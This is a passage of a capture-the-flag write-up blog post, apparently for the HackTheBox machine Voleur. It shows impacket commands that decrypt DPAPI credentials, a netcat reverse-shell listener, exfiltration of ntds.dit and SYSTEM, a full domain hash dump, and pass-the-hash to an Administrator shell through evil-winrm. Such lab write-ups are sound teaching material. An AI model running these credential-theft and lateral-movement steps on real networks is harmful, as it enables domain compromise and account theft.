-file 08949382-134f-4c63-b93c-ce52efc0aa88 -password <span class="string">&#x27;NightT1meP1dg3on14&#x27;</span> -sid S-1-5-21-3927696377-1337352550-2781715495-1110</span><br><span class="line">Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[MASTERKEYFILE]</span><br><span class="line">Version     :        2 (2)</span><br><span class="line">Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88</span><br><span class="line">Flags       :        0 (0)</span><br><span class="line">Policy      :        0 (0)</span><br><span class="line">MasterKeyLen: 00000088 (136)</span><br><span class="line">BackupKeyLen: 00000068 (104)</span><br><span class="line">CredHistLen : 00000000 (0)</span><br><span class="line">DomainKeyLen: 00000174 (372)</span><br><span class="line"></span><br><span class="line">Decrypted key with User Key (MD4 protected)</span><br><span class="line">Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83</span><br><span class="line">                                                                                                        </span><br><span class="line">┌──(kali㉿kali)-[~/targetedKerberoast]</span><br><span class="line">└─$ impacket-dpapi credential -f 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83</span><br><span class="line">Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[CREDENTIAL]</span><br><span class="line">LastWritten : 2025-01-29 12:55:19+00:00</span><br><span class="line">Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)</span><br><span class="line">Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)</span><br><span class="line">Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)</span><br><span class="line">Target      : Domain:target=Jezzas_Account</span><br><span class="line">Description : </span><br><span class="line">Unknown     : </span><br><span class="line">Username    : jeremy.combs</span><br><span class="line">Unknown     : qT3V9pLXyN7W4m</span><br></pre></td></tr></table></figure></div>
+
+
+<p>Next we are jeremy also:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ rlwrap nc -lvnp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [10.10.16.11] from (UNKNOWN) [10.10.11.76] 49166</span><br><span class="line">Windows PowerShell</span><br><span class="line">Copyright (C) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">Install the latest PowerShell <span class="keyword">for</span> new features and improvements! https://aka.ms/PSWindows</span><br><span class="line"></span><br><span class="line">PS C:\Windows\system32&gt; <span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">voleur\jeremy.combs</span><br></pre></td></tr></table></figure></div>
+
+<p>On jeremy we will find a note meant for third-line support:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">PS C:\it\third-line support&gt; <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\it\third-line support</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name                                                                 </span><br><span class="line">----                 -------------         ------ ----                                                                 </span><br><span class="line">d-----         1/30/2025   8:11 AM                Backups                                                              </span><br><span class="line">-a----         1/30/2025   8:10 AM           2602 id_rsa                                                               </span><br><span class="line">-a----         1/30/2025   8:07 AM            186 Note.txt.txt                                                         </span><br><span class="line">PS C:\it\third-line support&gt; <span class="built_in">cat</span> Note.txt.txt</span><br><span class="line"><span class="built_in">cat</span> Note.txt.txt</span><br><span class="line">Jeremy,</span><br><span class="line"></span><br><span class="line">I<span class="string">&#x27;ve had enough of Windows Backup! I&#x27;</span>ve part configured WSL to see <span class="keyword">if</span> we can utilize any of the backup tools from Linux.</span><br><span class="line"></span><br><span class="line">Please see what you can <span class="built_in">set</span> up.</span><br><span class="line"></span><br><span class="line">Thanks,</span><br><span class="line"></span><br><span class="line">Admin</span><br></pre></td></tr></table></figure></div>
+
+<p>We can then download the backup containing SYSTEM and ntds to our machine and dump the hashes:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/targetedKerberoast]</span><br><span class="line">└─$ scp -i id_rsa -P 2222 -r <span class="string">&quot;svc_backup@dc.voleur.htb:/mnt/c/IT/Third-Line Support/Backups&quot;</span> ./</span><br><span class="line">ntds.dit                                                              100%   24MB  94.0KB/s   04:21    </span><br><span class="line">ntds.jfm                                                              100%   16KB   9.0KB/s   00:01    </span><br><span class="line">SECURITY                                                              100%   32KB   5.3KB/s   00:06    </span><br><span class="line">SYSTEM                                                                100%   18MB 127.5KB/s   02:20 </span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/targetedKerberoast/Backups/Active Directory]</span><br><span class="line">└─$ impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL</span><br><span class="line">Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Searching <span class="keyword">for</span> pekList, be patient</span><br><span class="line">[*] PEK <span class="comment"># 0 found and decrypted: 898238e1ccd2ac0016a18c53f4569f40</span></span><br><span class="line">[*] Reading and decrypting hashes from ntds.dit </span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5aeef2c641148f9173d663be744e323c:::</span><br><span class="line">voleur.htb\ryan.naylor:1103:aad3b435b51404eeaad3b435b51404ee:3988a78c5a072b0a84065a809976ef16:::</span><br><span class="line">voleur.htb\marie.bryant:1104:aad3b435b51404eeaad3b435b51404ee:53978ec648d3670b1b83dd0b5052d5f8:::</span><br><span class="line">voleur.htb\lacey.miller:1105:aad3b435b51404eeaad3b435b51404ee:2ecfe5b9b7e1aa2df942dc108f749dd3:::</span><br><span class="line">voleur.htb\svc_ldap:1106:aad3b435b51404eeaad3b435b51404ee:0493398c124f7af8c1184f9dd80c1307:::</span><br><span class="line">voleur.htb\svc_backup:1107:aad3b435b51404eeaad3b435b51404ee:f44fe33f650443235b2798c72027c573:::</span><br><span class="line">voleur.htb\svc_iis:1108:aad3b435b51404eeaad3b435b51404ee:246566da92d43a35bdea2b0c18c89410:::</span><br><span class="line">voleur.htb\jeremy.combs:1109:aad3b435b51404eeaad3b435b51404ee:7b4c3ae2cbd5d74b7055b7f64c0b3b4c:::</span><br><span class="line">voleur.htb\svc_winrm:1601:aad3b435b51404eeaad3b435b51404ee:5d7e37717757433b4780079ee9b1d421:::</span><br><span class="line">[*] Kerberos keys from ntds.dit </span><br><span class="line">Administrator:aes256-cts-hmac-sha1-96:f577668d58955ab962be9a489c032f06d84f3b66cc05de37716cac917acbeebb</span><br><span class="line">Administrator:aes128-cts-hmac-sha1-96:38af4c8667c90d19b286c7af861b10cc</span><br><span class="line">Administrator:des-cbc-md5:459d836b9edcd6b0</span><br><span class="line">DC$:aes256-cts-hmac-sha1-96:65d713fde9ec5e1b1fd9144ebddb43221123c44e00c9dacd8bfc2cc7b00908b7</span><br><span class="line">DC$:aes128-cts-hmac-sha1-96:fa76ee3b2757db16b99ffa087f451782</span><br><span class="line">DC$:des-cbc-md5:64e05b6d1abff1c8</span><br><span class="line">krbtgt:aes256-cts-hmac-sha1-96:2500eceb45dd5d23a2e98487ae528beb0b6f3712f243eeb0134e7d0b5b25b145</span><br><span class="line">krbtgt:aes128-cts-hmac-sha1-96:04e5e22b0af794abb2402c97d535c211</span><br><span class="line">krbtgt:des-cbc-md5:34ae31d073f86d20</span><br><span class="line">voleur.htb\ryan.naylor:aes256-cts-hmac-sha1-96:0923b1bd1e31a3e62bb3a55c74743ae76d27b296220b6899073cc457191fdc74</span><br><span class="line">voleur.htb\ryan.naylor:aes128-cts-hmac-sha1-96:6417577cdfc92003ade09833a87aa2d1</span><br><span class="line">voleur.htb\ryan.naylor:des-cbc-md5:4376f7917a197a5b</span><br><span class="line">voleur.htb\marie.bryant:aes256-cts-hmac-sha1-96:d8cb903cf9da9edd3f7b98cfcdb3d36fc3b5ad8f6f85ba816cc05e8b8795b15d</span><br><span class="line">voleur.htb\marie.bryant:aes128-cts-hmac-sha1-96:a65a1d9383e664e82f74835d5953410f</span><br><span class="line">voleur.htb\marie.bryant:des-cbc-md5:cdf1492604d3a220</span><br><span class="line">voleur.htb\lacey.miller:aes256-cts-hmac-sha1-96:1b71b8173a25092bcd772f41d3a87aec938b319d6168c60fd433be52ee1ad9e9</span><br><span class="line">voleur.htb\lacey.miller:aes128-cts-hmac-sha1-96:aa4ac73ae6f67d1ab538addadef53066</span><br><span class="line">voleur.htb\lacey.miller:des-cbc-md5:6eef922076ba7675</span><br><span class="line">voleur.htb\svc_ldap:aes256-cts-hmac-sha1-96:2f1281f5992200abb7adad44a91fa06e91185adda6d18bac73cbf0b8dfaa5910</span><br><span class="line">voleur.htb\svc_ldap:aes128-cts-hmac-sha1-96:7841f6f3e4fe9fdff6ba8c36e8edb69f</span><br><span class="line">voleur.htb\svc_ldap:des-cbc-md5:1ab0fbfeeaef5776</span><br><span class="line">voleur.htb\svc_backup:aes256-cts-hmac-sha1-96:c0e9b919f92f8d14a7948bf3054a7988d6d01324813a69181cc44bb5d409786f</span><br><span class="line">voleur.htb\svc_backup:aes128-cts-hmac-sha1-96:d6e19577c07b71eb8de65ec051cf4ddd</span><br><span class="line">voleur.htb\svc_backup:des-cbc-md5:7ab513f8ab7f765e</span><br><span class="line">voleur.htb\svc_iis:aes256-cts-hmac-sha1-96:77f1ce6c111fb2e712d814cdf8023f4e9c168841a706acacbaff4c4ecc772258</span><br><span class="line">voleur.htb\svc_iis:aes128-cts-hmac-sha1-96:265363402ca1d4c6bd230f67137c1395</span><br><span class="line">voleur.htb\svc_iis:des-cbc-md5:70ce25431c577f92</span><br><span class="line">voleur.htb\jeremy.combs:aes256-cts-hmac-sha1-96:8bbb5ef576ea115a5d36348f7aa1a5e4ea70f7e74cd77c07aee3e9760557baa0</span><br><span class="line">voleur.htb\jeremy.combs:aes128-cts-hmac-sha1-96:b70ef221c7ea1b59a4cfca2d857f8a27</span><br><span class="line">voleur.htb\jeremy.combs:des-cbc-md5:192f702abff75257</span><br><span class="line">voleur.htb\svc_winrm:aes256-cts-hmac-sha1-96:6285ca8b7770d08d625e437ee8a4e7ee6994eccc579276a24387470eaddce114</span><br><span class="line">voleur.htb\svc_winrm:aes128-cts-hmac-sha1-96:f21998eb094707a8a3bac122cb80b831</span><br><span class="line">voleur.htb\svc_winrm:des-cbc-md5:32b61fb92a7010ab</span><br><span class="line">[*] Cleaning up... </span><br></pre></td></tr></table></figure></div>
+
+<p>And finally claim root flag:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/targetedKerberoast/Backups/Active Directory]</span><br><span class="line">└─$ impacket-getTGT -hashes aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2 <span class="string">&#x27;voleur.HTB/administrator&#x27;</span></span><br><span class="line">Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Saving ticket <span class="keyword">in</span> administrator.ccache</span><br><span class="line">                                                                                                        </span><br><span class="line">┌──(kali㉿kali)-[~/targetedKerberoast/Backups/Active Directory]</span><br><span class="line">└─$ <span class="built_in">export</span> KRB5CCNAME=administrator.ccache   </span><br><span class="line">                                                                                                        </span><br><span class="line">┌──(kali㉿kali)-[~/targetedKerberoast/Backups/Active Directory]</span><br><span class="line">└─$ evil-winrm -i dc.voleur.htb -r voleur.htb</span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine                                                                         </span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="comment">#Remote-path-completion                                                                                           </span></span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; <span class="built_in">cat</span> ../desktop/root.txt</span><br><span class="line">bec901f7785188b4f4209aa8372657dd</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; </span><br></pre></td></tr></table></figure></div>
+
+<p>That was it for Voleur, hope you learned something new!<br>-0xkujen</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Hackthebox: Voleur</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2025-11-01 12:28:42</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-11-01 14:04:29
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kujen5.github.io/2025/11/01/Hackthebox-Voleur/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2025/10/24/Hackthebox-Artificial/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Hackthebox: Artificial</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Hackthebox: Voleur</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Privilege-Escalation-ACL-abuse"><span class="nav-text">Privilege Escalation - ACL abuse</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Dpapi-Abuse"><span class="nav-text">Dpapi Abuse</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
